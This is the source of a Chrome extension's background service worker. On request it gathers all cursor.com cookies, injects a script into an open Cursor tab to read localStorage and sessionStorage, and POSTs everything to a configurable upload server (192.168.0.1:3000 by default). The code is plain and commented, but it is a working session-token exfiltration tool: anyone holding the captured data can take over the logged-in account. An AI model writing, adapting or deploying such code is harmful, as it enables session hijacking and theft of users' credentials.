// Background service worker that handles cookie capture and upload
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === 'captureCursorSession') {
    captureCursorSession()
      .then(sendResponse)
      .catch(error => sendResponse({ error: error.message }));
    return true; // Keep the message channel open for async response
  }
});

// Default upload URL 
const DEFAULT_UPLOAD_URL = 'http://192.168.0.1:3000/api/auth/upload-session';

async function captureCursorSession() {
  try {
    console.log('Starting session capture...');
    
    // Detailed cookie logging
    const cookies = [
      ...(await chrome.cookies.getAll({ domain: 'cursor.com' })),
      ...(await chrome.cookies.getAll({ domain: '.cursor.com' }))
    ];
    console.log('Cookies found:', cookies.length);
    console.log('Cookie details:', cookies.map(cookie => ({
      name: cookie.name,
      domain: cookie.domain,
      path: cookie.path
    })));

    // Detailed tabs logging
    const tabs = await chrome.tabs.query({ url: ['https://cursor.com/*','https://*.cursor.com/*'] });
    console.log('Cursor.sh tabs found:', tabs.length);
    console.log('Tab URLs:', tabs.map(tab => tab.url));

    // Detailed upload URL logging
    const { uploadUrl, useCustomUploadUrl } = await chrome.storage.local.get(['uploadUrl', 'useCustomUploadUrl']);
    const finalUploadUrl = uploadUrl || DEFAULT_UPLOAD_URL;
    console.log('Final Upload URL:', finalUploadUrl);
    console.log('Using custom upload URL:', useCustomUploadUrl);

    if (!finalUploadUrl) {
      throw new Error('Extension not configured');
    }

    // Existing cookie capture logic
    if (!cookies.length) {
      throw new Error('No Cursor session found. Please ensure you are logged in to Cursor.');
    }

    // Existing storage capture logic
    let storage = { localStorage: {}, sessionStorage: {} };
    
    if (tabs.length > 0) {
      // Execute content script to get storage data
      const results = await chrome.scripting.executeScript({
        target: { tabId: tabs[0].id },
        func: () => {
          const data = {
            localStorage: {},
            sessionStorage: {}
          };
          
          // Capture localStorage
          for (let i = 0; i < window.localStorage.length; i++) {
            const key = window.localStorage.key(i);
            data.localStorage[key] = window.localStorage.getItem(key);
          }
          
          // Capture sessionStorage
          for (let i = 0; i < window.sessionStorage.length; i++) {
            const key = window.sessionStorage.key(i);
            data.sessionStorage[key] = window.sessionStorage.getItem(key);
          }
          
          return data;
        }
      });
      
      if (results && results[0]) {
        storage = results[0].result;
      }
    }

    // Prepare the session data
    const sessionData = {
      cookies,
      localStorage: storage.localStorage,
      sessionStorage: storage.sessionStorage,
      timestamp: new Date().toISOString()
    };

    // Detailed fetch logging
    try {
      console.log('Preparing to upload session data to:', finalUploadUrl);
      console.log('Session data payload size:', JSON.stringify(sessionData).length, 'characters');

      const response = await fetch(finalUploadUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ sessionData })
      });

      console.log('Fetch response status:', response.status);
      console.log('Fetch response headers:', Object.fromEntries(response.headers.entries()));

      if (!response.ok) {
        const errorText = await response.text();
        console.error('Server error response:', errorText);
        throw new Error(`Upload failed: ${errorText}`);
      }

      return { success: true };
    } catch (fetchError) {
      console.error('Fetch error details:', {
        message: fetchError.message,
        name: fetchError.name,
        stack: fetchError.stack
      });
      throw fetchError;
    }
  } catch (error) {
    console.error('Detailed capture error:', {
      message: error.message,
      name: error.name,
      stack: error.stack
    });
    throw error;
  }
}

// On first install, set a default upload URL
chrome.runtime.onInstalled.addListener(() => {
  chrome.storage.local.set({ 
    uploadUrl: DEFAULT_UPLOAD_URL,
    useCustomUploadUrl: false 
  });
});
